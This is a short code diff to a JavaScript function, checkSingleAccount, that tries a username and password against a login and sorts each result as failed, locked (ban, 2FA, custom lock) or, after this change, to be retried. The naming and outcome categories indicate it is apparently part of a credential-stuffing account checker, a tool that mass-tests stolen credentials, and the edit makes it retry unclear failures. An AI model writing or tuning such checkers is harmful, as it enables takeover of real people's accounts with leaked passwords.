@@ -193,7 +193,7 @@ async function checkSingleAccount(credential, signal) {
     const status = checkStatus(text1, finalUrl, jar.dict());
     if (status !== "SUCCESS") {
       if (status === "FAILURE") return { status: "fail", user, password, detail: "Invalid Credentials" };
-      if (status === "UNKNOWN_FAILURE") return { status: "fail", user, password, detail: "Unknown Failure" };
+      if (status === "UNKNOWN_FAILURE") return { status: "retry", user, password, detail: "Unknown Failure" };
       if (status === "BAN") return { status: "locked", user, password, detail: "Banned" };
       if (status === "2FACTOR") return { status: "locked", user, password, detail: "2FA/Verify" };
       if (status === "CUSTOM_LOCK") return { status: "locked", user, password, detail: "Custom Lock" };
